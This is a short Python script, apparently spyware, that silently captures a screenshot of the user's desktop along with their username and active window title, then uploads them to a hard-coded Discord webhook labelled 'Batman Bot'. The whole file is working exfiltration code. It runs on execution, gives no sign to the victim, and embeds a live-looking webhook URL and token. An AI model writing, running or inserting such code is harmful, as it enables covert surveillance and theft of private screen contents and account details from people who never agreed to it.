import pyautogui
from discord_webhook import DiscordWebhook, DiscordEmbed
from time import sleep
import getpass
import pygetwindow as gw
import ctypes

def create_webhook():
    return DiscordWebhook(url='https://discord.com/api/webhooks/1181250956294365235/dTgbhtiAO2RID6vmWpuf88I3XnIkD17FgY19gRMKWXo71cOU-gQcEJgRVGbCCLvGA_fy', username="Batman")

def get_active_window_title():
    try:
        active_window = gw.getWindowsWithTitle(gw.getActiveWindow().title)
        if active_window:
            return active_window[0].title
    except Exception as e:
        print(f"Error getting active window title: {e}")
    return None

def screenshot():
    webhook_screenshot = create_webhook()
    username = getpass.getuser()
    active_window_title = get_active_window_title()
    image = pyautogui.screenshot()
    image_path = 'screenshot.png'
    image.save(image_path)
    embed = DiscordEmbed(title="Batman Infos", color=0x3498db)
    embed.set_footer(text="Captured by Batman Bot")
    embed.set_image(url='attachment://screenshot.png')
    embed.add_embed_field(name='Username', value=username)
    embed.add_embed_field(name='Active Window', value=active_window_title)
    webhook_screenshot.add_file(file=open(image_path, 'rb'), filename='screenshot.png')
    webhook_screenshot.add_embed(embed)
    response = webhook_screenshot.execute()
screenshot()
